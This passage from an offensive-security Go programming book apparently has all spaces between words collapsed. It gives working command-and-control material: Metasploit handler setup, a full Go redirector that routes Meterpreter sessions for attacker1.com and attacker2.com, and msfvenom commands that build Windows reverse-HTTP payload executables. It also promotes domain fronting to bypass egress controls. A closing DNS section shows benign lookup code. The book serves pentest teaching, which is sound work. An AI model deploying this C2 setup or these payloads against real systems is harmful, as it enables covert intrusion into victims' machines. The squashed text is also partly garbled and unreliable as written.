We’llendthischapterbypresentingmultiplexingHTTP
command-and-controlconnections.
MULTIPLEXINGCOMMAND-AND-
CONTROL
You’vearrivedatthelastsectionofthechapteronHTTP
servers.Here,you’lllookathowtomultiplexMeterpreter
HTTPconnectionstodifferentbackendcontrolservers.
Meterpreterisapopular,flexiblecommand-and-control(C2)
suitewithintheMetasploitexploitationframework.Wewon’t
gointotoomanydetailsaboutMetasploitorMeterpreter.If
you’renewtoit,werecommendreadingthroughoneofthe
manytutorialordocumentationsites.
Inthissection,we’llwalkthroughcreatingareverseHTTP
proxyinGosothatyoucandynamicallyrouteyourincoming
MeterpretersessionsbasedontheHostHTTPheader,whichis
howvirtualwebsitehostingworks.However,insteadof
servingdifferentlocalfilesanddirectories,you’llproxythe
connectiontodifferentMeterpreterlisteners.Thisisan
interestingusecaseforafewreasons.
First,yourproxyactsasaredirector,allowingyouto
exposeonlythatdomainnameandIPaddresswithout
exposingyourMetasploitlisteners.Iftheredirectorevergets
blacklisted,youcansimplymoveitwithouthavingtomove
yourC2server.Second,youcanextendtheconceptshereto
performdomainfronting,atechniqueforleveragingtrusted
third-partydomains(oftenfromcloudproviders)tobypass
restrictiveegresscontrols.Wewon’tgointoafull-fledged
examplehere,butwehighlyrecommendyoudigintoit,asit
canbeprettypowerful,allowingyoutoegressrestricted
networks.Lastly,theusecasedemonstrateshowyoucanshare
asinglehost/portcombinationamongateamofallies
potentiallyattackingdifferenttargetorganizations.Sinceports
80and443arethemostlikelyallowedegressports,youcan
useyourproxytolistenonthoseportsandintelligentlyroute
theconnectionstothecorrectlistener.
Here’stheplan.You’llsetuptwoseparateMeterpreter
reverseHTTPlisteners.Inthisexample,thesewillresideona
virtualmachinewithanIPaddressof10.0.1.20,buttheycould
verywellexistonseparatehosts.You’llbindyourlistenersto
ports10080and20080,respectively.Inarealsituation,these
listenerscanberunninganywheresolongastheproxycan
reachthoseports.MakesureyouhaveMetasploitinstalled(it
comespre-installedonKaliLinux);thenstartyourlisteners.
$msfconsole
>useexploit/multi/handler
>setpayloadwindows/meterpreter_reverse_http
❶>setLHOST10.0.1.20
>setLPORT80
❷>setReverseListenerBindAddress10.0.1.20
>setReverseListenerBindPort10080
>exploit-j-z
[*]Exploitrunningasbackgroundjob1.
[*]StartedHTTPreversehandleronhttp://10.0.1.20:10080
Whenyoustartyourlistener,yousupplytheproxydataas
theLHOSTandLPORTvalues❶.However,yousetthe
advancedoptionsReverseListenerBindAddressand
ReverseListenerBindPorttotheactualIPandportonwhichyou
wantthelistenertostart❷.Thisgivesyousomeflexibilityin
portusagewhileallowingyoutoexplicitlyidentifytheproxy
host—whichmaybeahostname,forexample,ifyouwere
settingupdomainfronting.
OnasecondinstanceofMetasploit,you’lldosomething
similartostartanadditionallisteneronport20080.Theonly
realdifferencehereisthatyou’rebindingtoadifferentport:
$msfconsole
>useexploit/multi/handler
>setpayloadwindows/meterpreter_reverse_http
>setLHOST10.0.1.20
>setLPORT80
>setReverseListenerBindAddress10.0.1.20
>setReverseListenerBindPort20080
>exploit-j-z
[*]Exploitrunningasbackgroundjob1.
[*]StartedHTTPreversehandleronhttp://10.0.1.20:20080
Now,let’screateyourreverseproxy.Listing4-10shows
thecodeinitsentirety.
packagemain
import(
"log"
"net/http"
❶"net/http/httputil"
"net/url"
"github.com/gorilla/mux"
)
❷var(
hostProxy=make(map[string]string)
proxies=make(map[string]*httputil.ReverseProxy)
)
funcinit(){
❸hostProxy["attacker1.com"]="http://10.0.1.20:10080"
hostProxy["attacker2.com"]="http://10.0.1.20:20080"
fork,v:=rangehostProxy{
❹remote,err:=url.Parse(v)
iferr!=nil{
log.Fatal("Unabletoparseproxytarget")
}
❺proxies[k]=httputil.NewSingleHostReverseProxy(remote)
}
}
funcmain(){
r:=mux.NewRouter()
forhost,proxy:=rangeproxies{
❻r.Host(host).Handler(proxy)
}
log.Fatal(http.ListenAndServe(":80",r))
}
Listing4-10:MultiplexingMeterpreter(/ch-4/multiplexer/main.go)
Firstoff,you’llnoticethatyou’reimportingthe
net/http/httputilpackage❶,whichcontainsfunctionalitytoassist
withcreatingareverseproxy.It’llsaveyoufromhavingto
createonefromscratch.
Afteryouimportyourpackages,youdefineapairof
variables❷.Bothvariablesaremaps.You’llusethefirst,
hostProxy,tomaphostnamestotheURLoftheMetasploit
listenertowhichyou’llwantthathostnametoroute.
Remember,you’llberoutingbasedontheHostheaderthat
yourproxyreceivesintheHTTPrequest.Maintainingthis
mappingisasimplewaytodeterminedestinations.
Thesecondvariableyoudefine,proxies,willalsouse
hostnamesasitskeyvalues.However,theircorresponding
valuesinthemapare*httputil.ReverseProxyinstances.Thatis,the
valueswillbeactualproxyinstancestowhichyoucanroute,
ratherthanstringrepresentationsofthedestination.
Noticethatyou’rehardcodingthisinformation,whichisn’t
themostelegantwaytomanageyourconfigurationandproxy
data.Abetterimplementationwouldstorethisinformationin
anexternalconfigurationfileinstead.We’llleavethatasan
exerciseforyou.
Youuseaninit()functiontodefinethemappingsbetween
domainnamesanddestinationMetasploitinstances❸.Inthis
case,you’llrouteanyrequestwithaHostheadervalueof
attacker1.comtohttp://10.0.1.20:10080andanythingwithaHostheader
valueofattacker2.comtohttp://10.0.1.20:20080.Ofcourse,youaren’t
actuallydoingtheroutingyet;you’rejustcreatingyour
rudimentaryconfiguration.Noticethatthedestinations
correspondtotheReverseListenerBindAddressand
ReverseListenerBindPortvaluesyouusedforyourMeterpreter
listenersearlier.
Next,stillwithinyourinit()function,youloopoveryour
hostProxymap,parsingthedestinationaddressestocreatenet.URL
instances❹.Youusetheresultofthisasinputintoacallto
httputil.NewSingleHostReverseProxy(net.URL)❺,whichisahelper
functionthatcreatesareverseproxyfromaURL.Evenbetter,
thehttputil.ReverseProxytypesatisfiesthehttp.Handlerinterface,
whichmeansyoucanusethecreatedproxyinstancesas
handlersforyourrouter.Youdothiswithinyourmain()
function.Youcreatearouterandthenloopoverallofyour
proxyinstances.Recallthatthekeyisthehostname,andthe
valueisoftypehttputil.ReverseProxy.Foreachkey/valuepairin
yourmap,youaddamatchingfunctionontoyourrouter❻.
TheGorillaMUXtoolkit’sRoutetypecontainsamatching
functionnamedHostthatacceptsahostnametomatchHost
headervaluesinincomingrequestsagainst.Foreachhostname
youwanttoinspect,youtelltheroutertousethe
correspondingproxy.It’sasurprisinglyeasysolutiontowhat
couldotherwisebeacomplicatedproblem.
Yourprogramfinishesbystartingtheserver,bindingitto
port80.Saveandruntheprogram.You’llneedtodosoasa
privilegedusersinceyou’rebindingtoaprivilegedport.
Atthispoint,youhavetwoMeterpreterreverseHTTP
listenersrunning,andyoushouldhaveareverseproxyrunning
nowaswell.Thelaststepistogeneratetestpayloadstocheck
thatyourproxyworks.Let’susemsfvenom,apayloadgeneration
toolthatshipswithMetasploit,togenerateapairofWindows
executablefiles:
$msfvenom-pwindows/meterpreter_reverse_httpLHOST=10.0.1.20
LPORT=80
HttpHostHeader=attacker1.com-fexe-opayload1.exe
$msfvenom-pwindows/meterpreter_reverse_httpLHOST=10.0.1.20
LPORT=80
HttpHostHeader=attacker2.com-fexe-opayload2.exe
Thisgeneratestwooutputfilesnamedpayload1.exeand
payload2.exe.Noticethattheonlydifferencebetweenthetwo,
besidestheoutputfilename,istheHttpHostHeadervalues.This
ensuresthattheresultingpayloadsendsitsHTTPrequests
withaspecificHostheadervalue.AlsoofnoteisthattheLHOST
andLPORTvaluescorrespondtoyourreverseproxy
informationandnotyourMeterpreterlisteners.Transferthe
resultingexecutablestoaWindowssystemorvirtualmachine.
Whenyouexecutethefiles,youshouldseetwonewsessions
established:oneonthelistenerboundtoport10080,andone
onthelistenerboundtoport20080.Theyshouldlook
somethinglikethis:
>
[*]http://10.0.1.20:10080handlingrequestfrom10.0.1.20;(UUID:hff7podk)
Redirectingstageless
connectionfrom/pxS_2gL43lv34_birNgRHgL4AJ3A9w3i9FXG3Ne2-
3UdLhACr8-Qt6QOlOw
PTkzww3NEptWTOan2rLo5RT42eOdhYykyPYQy8dq3Bq3Mi2TaAEBwithUA
'Mozilla/5.0(WindowsNT6.1;
Trident/7.0;
rv:11.0)likeGecko'
[*]http://10.0.1.20:10080handlingrequestfrom10.0.1.20;(UUID:hff7podk)
Attaching
orphaned/stagelesssession...
[*]Meterpretersession1opened(10.0.1.20:10080->10.0.1.20:60226)at2020-07-
0316:13:34-0500
IfyouusetcpdumporWiresharktoinspectnetworktraffic
destinedforport10080or20080,youshouldseethatyour
reverseproxyistheonlyhostcommunicatingwiththe
Metasploitlistener.YoucanalsoconfirmthattheHostheader
issetappropriatelytoattacker1.com(forthelisteneronport
10080)andattacker2.com(forthelisteneronport20080).
That’sit.You’vedoneit!Now,takeitupanotch.Asan
exerciseforyou,werecommendyouupdatethecodetousea
stagedpayload.Thislikelycomeswithadditionalchallenges,
asyou’llneedtoensurethatbothstagesareproperlyrouted
throughtheproxy.Further,trytoimplementitbyusing
HTTPSinsteadofcleartextHTTP.Thiswillfurtheryour
understandingandeffectivenessatproxyingtrafficinuseful,
nefariousways.
SUMMARY
You’vecompletedyourjourneyofHTTP,workingthrough
bothclientandserverimplementationsoverthelasttwo
chapters.Inthenextchapter,you’llfocusonDNS,anequally
usefulprotocolforsecuritypractitioners.Infact,you’llcome
closetoreplicatingthisHTTPmultiplexingexampleusing
DNS.
5
EXPLOITINGDNS
TheDomainNameSystem(DNS)locatesinternetdomain
namesandtranslatesthemtoIPaddresses.Itcanbean
effectiveweaponinthehandsofanattacker,because
organizationscommonlyallowtheprotocoltoegressrestricted
networksandtheyfrequentlyfailtomonitoritsuse
adequately.Ittakesalittleknowledge,butsavvyattackerscan
leveragetheseissuesthroughoutnearlyeverystepofanattack
chain,includingreconnaissance,commandandcontrol(C2),
andevendataexfiltration.Inthischapter,you’lllearnhowto
writeyourownutilitiesbyusingGoandthird-partypackages
toperformsomeofthesecapabilities.
You’llstartbyresolvinghostnamesandIPaddressesto
revealthemanytypesofDNSrecordsthatcanbeenumerated.
Thenyou’llusepatternsillustratedinearlierchapterstobuild
amassivelyconcurrentsubdomain-guessingtool.Finally,
you’lllearnhowtowriteyourownDNSserverandproxy,and
you’lluseDNStunnelingtoestablishaC2channeloutofa
restrictivenetwork!
WRITINGDNSCLIENTS
Beforeexploringprogramsthataremorecomplex,let’sget
acquaintedwithsomeoftheoptionsavailableforclient
operations.Go’sbuilt-innetpackageoffersgreatfunctionality
andsupportsmost,ifnotall,recordtypes.Theupsidetothe
built-inpackageisitsstraightforwardAPI.Forexample,
LookupAddr(addrstring)returnsalistofhostnamesforagivenIP
address.ThedownsideofusingGo’sbuilt-inpackageisthat
youcan’tspecifythedestinationserver;instead,thepackage
willusetheresolverconfiguredonyouroperatingsystem.
Anotherdownsideisthatyoucan’trundeepinspectionofthe
results.
Togetaroundthis,you’lluseanamazingthird-party
packagecalledtheGoDNSpackagewrittenbyMiekGieben.
ThisisourpreferredDNSpackagebecauseit’shighly
modular,wellwritten,andwelltested.Usethefollowingto
installthispackage:
$gogetgithub.com/miekg/dns
Oncethepackageisinstalled,you’rereadytofollowalong
withtheupcomingcodeexamples.You’llbeginbyperforming
ArecordlookupsinordertoresolveIPaddressesfor
hostnames.
RetrievingARecords
Let’sstartbyperformingalookupforafullyqualifieddomain
name(FQDN),whichspecifiesahost’sexactlocationinthe
DNShierarchy.Thenwe’llattempttoresolvethatFQDNtoan
IPaddress,usingatypeofDNSrecordcalledanArecord.We
useArecordstopointadomainnametoanIPaddress.Listing
5-1showsanexamplelookup.(Allthecodelistingsattheroot
locationof/existundertheprovidedgithubrepo
https://github.com/blackhat-go/bhg/.)
packagemain
import(
"fmt"
"github.com/miekg/dns"
)
funcmain(){
❶varmsgdns.Msg
❷fqdn:=dns.Fqdn("stacktitan.com")
❸msg.SetQuestion(fqdn,dns.TypeA)
❹dns.Exchange(&msg,"8.8.8.8:53")
}
Listing5-1:RetrievinganArecord(/ch-5/get_a/main.go)
StartbycreatinganewMsg❶andthencallfqdn(string)to
transformthedomainintoaFQDNthatcanbeexchangedwith
aDNSserver❷.Next,modifytheinternalstateoftheMsg
withacalltoSetQuestion(string,uint16)byusingtheTypeAvalueto
denoteyourintenttolookupanArecord❸.(Thisisaconst
definedinthepackage.Youcanviewtheothersupported
valuesinthepackagedocumentation.)Finally,placeacallto
Exchange(*Msg,string)❹inordertosendthemessagetothe
providedserveraddress,whichisaDNSserveroperatedby
Googleinthiscase.
Asyoucanprobablytell,thiscodeisn’tveryuseful.
Althoughyou’resendingaquerytoaDNSserverandasking
fortheArecord,youaren’tprocessingtheanswer;youaren’t
doinganythingmeaningfulwiththeresult.Priorto
programmaticallydoingthatinGo,let’sfirstreviewwhatthe
DNSanswerlookslikesothatwecangainadeeper
understandingoftheprotocolandthedifferentquerytypes.
BeforeyouexecutetheprograminListing5-1,runa
packetanalyzer,suchasWiresharkortcpdump,toviewthe
traffic.Here’sanexampleofhowyoumightusetcpdumpona
Linuxhost:
$sudotcpdump-ieth0-nudpport53
Inaseparateterminalwindow,compileandexecuteyour
programlikethis:
$gorunmain.go
Onceyouexecuteyourcode,youshouldseeaconnection
to8.8.8.8overUDP53intheoutputfromyourpacketcapture.
YoushouldalsoseedetailsabouttheDNSprotocol,asshown
here:
$sudotcpdump-ieth0-nudpport53
tcpdump:verboseoutputsuppressed,use-vor-vvforfullprotocoldecode
listeningonens33,link-typeEN10MB(Ethernet),capturesize262144bytes
23:55:16.523741IP192.168.7.51.53307>8.8.8.8.53:❶25147+A?❷
stacktitan.com.(32)
23:55:16.650905IP8.8.8.8.53>192.168.7.51.53307:251471/0/0A
104.131.56.170(48)❸
Thepacketcaptureoutputproducesacoupleoflinesthat
requirefurtherexplanation.First,aqueryisbeingplacedfrom
192.168.7.51to8.8.8.8byusingUDP53❶whilerequesting
aDNSArecord❷.Theresponse❸isreturnedfrom
Google’s8.8.8.8DNSserver,whichcontainstheresolvedIP
address,104.131.56.170.
Usingapacketanalyzersuchastcpdump,you’reableto
resolvethedomainnamestacktitan.comtoanIPaddress.Now
let’stakealookathowtoextractthatinformationbyusing
Go.
ProcessingAnswersfromaMsgstruct
ThereturnedvaluesfromExchange(*Msg,string)are(*Msg,error).
ReturningtheerrortypemakessenseandiscommoninGo
idioms,butwhydoesitreturn*Msgifthat’swhatyoupassed
in?Toclarifythis,lookathowthestructisdefinedinthe
source:
typeMsgstruct{
MsgHdr
Compressbool`json:"-"`//Iftrue,themessagewillbecompressed...
❶Question[]Question//HoldstheRR(s)ofthequestionsection.
❷Answer[]RR//HoldstheRR(s)oftheanswersection.
Ns[]RR//HoldstheRR(s)oftheauthoritysection.
Extra[]RR//HoldstheRR(s)oftheadditionalsection.
}
Asyoucansee,theMsgstructholdsbothquestionsand
answers.ThisletsyouconsolidateallyourDNSquestionsand
theiranswersintoasingle,unifiedstructure.TheMsgtypehas
variousmethodsthatmakeworkingwiththedataeasier.For
example,theQuestionslice❶isbeingmodifiedwiththe
conveniencemethodSetQuestion().Youcouldmodifythisslice
directlybyusingappend()andachievethesameoutcome.The
Answerslice❷holdstheresponsetothequeriesandisoftype
RR.Listing5-2demonstrateshowtoprocesstheanswers.
packagemain
import(
"fmt"
"github.com/miekg/dns"
)
funcmain(){
varmsgdns.Msg
fqdn:=dns.Fqdn("stacktitan.com")
msg.SetQuestion(fqdn,dns.TypeA)
❶in,err:=dns.Exchange(&msg,"8.8.8.8:53")
iferr!=nil{
panic(err)
}
❷iflen(in.Answer)<1{
fmt.Println("Norecords")
return
}
for_,answer:=rangein.Answer{
ifa❸,ok:=answer.(*dns.A)❹;ok{
❺fmt.Println(a.A)
}
}
}
Listing5-2:ProcessingDNSanswers(/ch-5/get_all_a/main.go)